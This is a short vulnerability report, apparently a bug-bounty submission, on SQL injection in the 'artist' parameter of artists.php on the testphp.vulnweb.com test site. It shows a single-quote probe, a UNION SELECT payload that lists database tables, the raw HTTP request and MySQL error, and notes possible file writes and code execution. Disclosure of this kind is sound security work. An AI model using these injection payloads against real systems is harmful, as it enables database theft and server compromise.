title: SQL Injection in artists.php via artist Parameter on testphp.vulnweb.com
vulnerability_information:
## Summary
The `artist` parameter on `http://testphp.vulnweb.com/artists.php` is vulnerable to SQL Injection. The parameter value is passed directly into a SQL query without proper sanitization or parameterized queries.

## Steps to Reproduce
1. Navigate to `http://testphp.vulnweb.com/artists.php?artist=1`
2. Append a single quote to the artist parameter: `http://testphp.vulnweb.com/artists.php?artist=1'`
3. Observe the MySQL error in the response confirming SQL injection
4. Use UNION-based injection to extract data:
   ```
   http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,2,3,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--
   ```

## Proof of Concept
```http
GET /artists.php?artist=1' HTTP/1.1
Host: testphp.vulnweb.com
```

Response contains:
```
Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
```

This confirms the parameter is directly concatenated into the SQL query.

## Impact
- Full database access â€” read all tables including user credentials
- Potential to write files to the server
- Possible Remote Code Execution via INTO OUTFILE or other MySQL features
- Complete compromise of the application and its data
